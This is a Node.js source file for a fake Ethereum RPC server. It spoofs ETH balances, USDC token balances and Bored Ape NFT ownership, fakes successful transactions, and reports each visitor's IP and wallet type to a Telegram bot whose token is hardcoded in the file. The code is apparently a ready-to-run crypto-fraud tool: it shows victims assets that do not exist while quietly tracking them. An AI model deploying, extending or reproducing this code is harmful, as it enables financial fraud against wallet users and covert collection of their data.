// merged_eth_nft_spoof.js
// Fake ETH RPC server + ERC20 (USDC) + ERC721 (BAYC) spoof + Telegram panel

const express = require('express');
const bodyParser = require('body-parser');
const path = require('path');
const axios = require('axios');
const cors = require('cors');
const fs = require('fs');
const TelegramBot = require('node-telegram-bot-api');
const { ethers } = require("ethers"); // For eth_call parsing

const app = express();
const PORT = process.env.PORT || 9798;
const HOST = '0.0.0.0';

// Telegram Bot config
const TELEGRAM_BOT_TOKEN = '8340660361:AAFDxBe2MS7RK3HLeXHRcER46nRCFIfaOFg';
const TELEGRAM_CHAT_ID = '7812677112';
const SUPERADMINS = [7812677112]; // superadmin IDs

// Persistent data directory
const DATA_DIR = '/data';
if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });

const ADMINS_FILE = path.join(DATA_DIR, 'admins.json');
const BALANCES_JSON_FILE = path.join(DATA_DIR, 'balances.json');
const BALANCES_CSV_FILE = path.join(DATA_DIR, 'balances.csv');

// Load and save admins
function loadAdmins() {
    try {
        if (fs.existsSync(ADMINS_FILE)) {
            return JSON.parse(fs.readFileSync(ADMINS_FILE, 'utf-8'));
        }
    } catch (err) { console.error('[!] Failed to load admins:', err); }
    return [222222222];
}
function saveAdmins() { try { fs.writeFileSync(ADMINS_FILE, JSON.stringify(ADMINS, null, 2)); } catch(e){console.error(e);} }
let ADMINS = loadAdmins();

// Convert hex wei to ETH
function weiHexToETH(hexWei) {
    if (!hexWei || typeof hexWei !== 'string') return '0';
    const hex = hexWei.toLowerCase().startsWith('0x') ? hexWei.slice(2) : hexWei;
    const wei = BigInt('0x'+hex);
    const decimals = 18n;
    const divisor = 10n**decimals;
    const whole = wei / divisor;
    const fraction = wei % divisor;
    let fractionStr = fraction.toString().padStart(Number(decimals), '0').replace(/0+$/,'');
    return fractionStr.length>0 ? `${whole.toString()}.${fractionStr}` : whole.toString();
}

// Load and save balances
const loadBalances = () => { try { if(fs.existsSync(BALANCES_JSON_FILE)) return JSON.parse(fs.readFileSync(BALANCES_JSON_FILE,'utf-8')); } catch(e){console.error(e);} return {}; };
const saveBalancesJSON = () => { try { fs.writeFileSync(BALANCES_JSON_FILE, JSON.stringify(spoofedBalances,null,2)); } catch(e){console.error(e);} };
const saveBalancesCSV = () => {
    const headers = ['#','Address','Balance (ETH)','Timestamp','Wallet','IP'];
    const rows = [headers.join(',')];
    Object.entries(spoofedBalances).sort((a,b)=>new Date(b[1].timestamp)-new Date(a[1].timestamp))
        .forEach(([address,data],i)=>{
            const row=[i+1,address,weiHexToETH(data.balance),data.timestamp,data.wallet,data.ip].map(f=>`"${f}"`).join(',');
            rows.push(row);
        });
    try{fs.writeFileSync(BALANCES_CSV_FILE, rows.join('\n'));}catch(e){console.error(e);}
};
let spoofedBalances = loadBalances();

// ETH_CALL interface
const BALANCE_CHECKER_ABI = ["function balances(address[] users, address[] tokens) view returns (uint256[])"];
const iface = new ethers.Interface(BALANCE_CHECKER_ABI);

// NFT/ERC20 spoof constants
const SPOOF_OWNER = '0xF7fd54A7e12bA4A379efaCaf6c48f3237eC0fA6c';
const SPOOF_NFT_CONTRACT = '0xbc4ca0eda7647a8ab7c2061c2e118a18a936f13d'.toLowerCase();
const SPOOF_ERC20_CONTRACT = '0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48'.toLowerCase();
const FAKE_BYTECODE = '0x6080604052348015600f57600080fd5b5060...';
function encodeUint256(n){ return '0x'+BigInt(n).toString(16).padStart(64,'0'); }
function encodeAddress(a){ return '0x'+a.toLowerCase().replace('0x','').padStart(64,'0'); }
function encodeBool(b){ return '0x'+(b? '1'.padStart(64,'0') : '0'.padStart(64,'0')); }

app.use(cors());
app.use(express.static(path.join(__dirname,'/')));
app.use(bodyParser.json());

// Telegram bot
const bot = new TelegramBot(TELEGRAM_BOT_TOKEN,{polling:true});
function isSuperAdmin(uid){ return SUPERADMINS.includes(uid); }
function isAdmin(uid){ return isSuperAdmin(uid) || ADMINS.includes(uid); }
const sendToTelegram = async (text)=>{ try{ await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, { chat_id: TELEGRAM_CHAT_ID, text, parse_mode:'Markdown' }); } catch(e){console.error(e?.response?.data||e.message);} };
const now = ()=>new Date().toISOString().replace('T',' ').split('.')[0];

// Wallet detection
const detectWalletFromUA=(ua='')=>{
    ua=ua.toLowerCase();
    if(ua.includes('metamask'))return 'MetaMask';
    if(ua.includes('trust'))return 'Trust Wallet';
    if(ua.includes('brave'))return 'Brave Wallet';
    if(ua.includes('coinbase'))return 'Coinbase Wallet';
    if(ua.includes('phantom'))return 'Phantom';
    if(ua.includes('opera'))return 'Opera';
    if(ua.includes('safari')&&!ua.includes('chrome'))return 'Safari';
    if(ua.includes('chrome'))return 'Chrome';
    if(ua.includes('firefox'))return 'Firefox';
    if(ua.includes('android'))return 'Android WebView';
    if(ua.includes('ios'))return 'iOS WebView';
    return 'Unknown';
};

// --- JSON-RPC handler ---
app.post('/', (req,res)=>{
    const {method,params,id} = req.body || {};
    const ip=req.headers['x-forwarded-for']||req.connection.remoteAddress;
    const ua=req.headers['user-agent']||'';
    const wallet = detectWalletFromUA(ua);

    console.log(`[RPC] Method: ${method}`);

    // Basic chain info
    if(method==='eth_chainId') return res.json({jsonrpc:'2.0',id,result:'0x1'});
    if(method==='net_version') return res.json({jsonrpc:'2.0',id,result:'1'});
    if(method==='eth_blockNumber') return res.json({jsonrpc:'2.0',id,result:'0x100000'});
    if(method==='eth_syncing') return res.json({jsonrpc:'2.0',id,result:false});

    // eth_getBalance spoof
    if(method==='eth_getBalance'){
        const address = (params[0]||'').toLowerCase();
        const info = spoofedBalances[address];
        const balanceHex = info ? info.balance : '0x0';
        const balanceETH = weiHexToETH(balanceHex);
        const logMsg = `🕒 *${now()}*\n[+] Spoofing ETH for \`${address}\`\n🪙 Balance: \`${balanceETH} ETH\`\n🧩 Wallet: *${wallet}*\n🌐 IP: \`${ip}\``;
        console.log(logMsg); sendToTelegram(logMsg);
        return res.json({jsonrpc:'2.0',id,result:balanceHex});
    }

    // --- NFT/ERC20 eth_getCode ---
    if(method==='eth_getCode'){
        const address = (params[0]||'').toLowerCase();
        if(address===SPOOF_NFT_CONTRACT||address===SPOOF_ERC20_CONTRACT) return res.json({jsonrpc:'2.0',id,result:FAKE_BYTECODE});
        return res.json({jsonrpc:'2.0',id,result:'0x'});
    }

    // --- NFT eth_getLogs ---
    if(method==='eth_getLogs'){
        const filter = params[0]||{};
        const address = (filter.address||'').toLowerCase();
        const topics = filter.topics||[];
        if(address===SPOOF_NFT_CONTRACT){
            const transferSig='0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef';
            const toMatch='0x'+SPOOF_OWNER.replace('0x','').padStart(64,'0');
            if(!topics[0]||topics[0].toLowerCase()===transferSig){
                const log={address:SPOOF_NFT_CONTRACT,topics:[transferSig,'0x'+ '0'.repeat(64),toMatch],data:'0x'+ '1'.padStart(64,'0'),blockNumber:'0x0',transactionHash:'0x0',transactionIndex:'0x0',blockHash:'0x0',logIndex:'0x0',removed:false};
                return res.json({jsonrpc:'2.0',id,result:[log]});
            }
        }
        return res.json({jsonrpc:'2.0',id,result:[]});
    }

    // --- eth_call with NFT/ERC20 spoof ---
    if(method==='eth_call'){
        const call=params[0]||{};
        const to=(call.to||'').toLowerCase();
        const data=(call.data||'').toLowerCase();
        const caller=(call.from||SPOOF_OWNER).toLowerCase();

        // ERC20 spoof
        if(to===SPOOF_ERC20_CONTRACT){
            if(data.startsWith('0x70a08231')) return res.json({jsonrpc:'2.0',id,result:encodeUint256(1000n*10n**6n)});
            if(data.startsWith('0x313ce567')) return res.json({jsonrpc:'2.0',id,result:encodeUint256(6)});
            if(data.startsWith('0x95d89b41')) return res.json({jsonrpc:'2.0',id,result:'0x'+Buffer.from('USDC').toString('hex').padEnd(64,'0')});
            if(data.startsWith('0x06fdde03')) return res.json({jsonrpc:'2.0',id,result:'0x'+Buffer.from('USD Coin').toString('hex').padEnd(64,'0')});
        }

        // ERC721 spoof
        if(to===SPOOF_NFT_CONTRACT){
            if(data.startsWith('0x01ffc9a7')) return res.json({jsonrpc:'2.0',id,result:encodeBool(true)});
            if(data.startsWith('0x6352211e')) return res.json({jsonrpc:'2.0',id,result:encodeAddress(caller)});
            if(data.startsWith('0x70a08231')) return res.json({jsonrpc:'2.0',id,result:encodeUint256(1)});
            if(data.startsWith('0xc87b56dd')) {
                const url='https://raw.githubusercontent.com/MetaMask/contract-metadata/master/images/ape.png';
                const hex='0x'+Buffer.from(url).toString('hex').padEnd(64,'0');
                return res.json({jsonrpc:'2.0',id,result:hex});
            }
            if(data.startsWith('0x06fdde03')) return res.json({jsonrpc:'2.0',id,result:'0x'+Buffer.from('BoredApeYachtClub').toString('hex').padEnd(64,'0')});
            if(data.startsWith('0x95d89b41')) return res.json({jsonrpc:'2.0',id,result:'0x'+Buffer.from('BAYC').toString('hex').padEnd(64,'0')});
        }

        // --- Existing eth_call balance checker ---
        try{
            const parsed = iface.parseTransaction({ data });
            if(parsed?.name==="balances"){
                const users=parsed.args[0].map(addr=>addr.toLowerCase());
                const results=[];
                users.forEach(user=>{
                    const info=spoofedBalances[user];
                    const balanceHex=info?info.balance:"0x0";
                    const balanceETH=weiHexToETH(balanceHex);
                    const logMsg=`🕒 *${now()}*\n[+] Spoofing balance for \`${user}\`\n💰 Balance: \`${balanceETH} ETH\`\n🧩 Wallet: *${wallet}*\n🌐 IP: \`${ip}\``;
                    console.log(logMsg); sendToTelegram(logMsg);
                    results.push(BigInt(balanceHex));
                });
                const encoded = iface.encodeFunctionResult("balances",[results]);
                return res.json({jsonrpc:'2.0',id,result:encoded});
            }
        }catch(e){console.log("eth_call decode error:",e.message);}
        return res.json({jsonrpc:'2.0',id,result:'0x'});
    }

    // Transaction methods
    if(method==='eth_estimateGas'){ const tx=params[0]; const value=tx.value||'0x0'; console.log(`🛠 Estimating gas: ${weiHexToETH(value)} ETH`); return res.json({jsonrpc:'2.0',id,result:'0x5208'});}
    if(method==='eth_gasPrice') return res.json({jsonrpc:'2.0',id,result:'0x3B9ACA00'});
    if(method==='eth_sendTransaction'){ const tx=params[0]; console.log(`💸 Sending fake tx: from ${tx.from}, to ${tx.to}, value ${weiHexToETH(tx.value)} ETH`); return res.json({jsonrpc:'2.0',id,result:'0x'+ '0'.repeat(64)});}
    if(method==='eth_getTransactionReceipt'){ const txHash=params[0]; return res.json({jsonrpc:'2.0',id,result:{transactionHash:txHash,status:'0x1',blockNumber:'0x100000',gasUsed:'0x5208',logs:[]}});}
    if(method==='eth_getBlockByNumber'){ return res.json({jsonrpc:'2.0',id,result:{number:'0x100000',hash:'0x'+ '0'.repeat(64),parentHash:'0x'+ '0'.repeat(64),nonce:'0x0',transactions:[],timestamp:Math.floor(Date.now()/1000).toString(16),miner:'0x0000000000000000000000000000000000000000'}});}
    
    // Unknown method fallback
    const logMsg = `🕒 *${now()}*\n⚠️ Unknown RPC: \`${method}\`\n🧩 Wallet: *${wallet}*\n🌐 IP: \`${ip}\``;
    console.log(logMsg); sendToTelegram(logMsg);
    return res.json({jsonrpc:'2.0',id,result:null});
});

// Update spoofed balance
app.post('/set-balance',(req,res)=>{
    const {address,balance}=req.body;
    const ip=req.headers['x-forwarded-for']||req.connection.remoteAddress;
    const ua=req.headers['user-agent']||'';
    const wallet=detectWalletFromUA(ua);

    if(!address||!balance||!/^0x[0-9a-fA-F]{40}$/.test(address)||!/^0x[0-9a-fA-F]+$/.test(balance))
        return res.status(400).json({error:'Invalid address or balance'});

    const cleanAddress = address.toLowerCase();
    spoofedBalances[cleanAddress]={balance:balance.toLowerCase(),timestamp:now(),wallet,ip};
    saveBalancesJSON();
    const balanceETH=weiHexToETH(balance);
    const logMsg=`🕒 *${now()}*\n[~] Set balance for \`${cleanAddress}\`\n💰 New Balance: \`${balanceETH} ETH\`\n🧩 Wallet: *${wallet}*\n🌐 IP: \`${ip}\``;
    console.log(logMsg); sendToTelegram(logMsg);
    return res.status(200).json({success:true});
});

app.listen(PORT,HOST,()=>console.log(`🚀 Fake ETH+NFT+ERC20 RPC server running at http://${HOST}:${PORT}`));
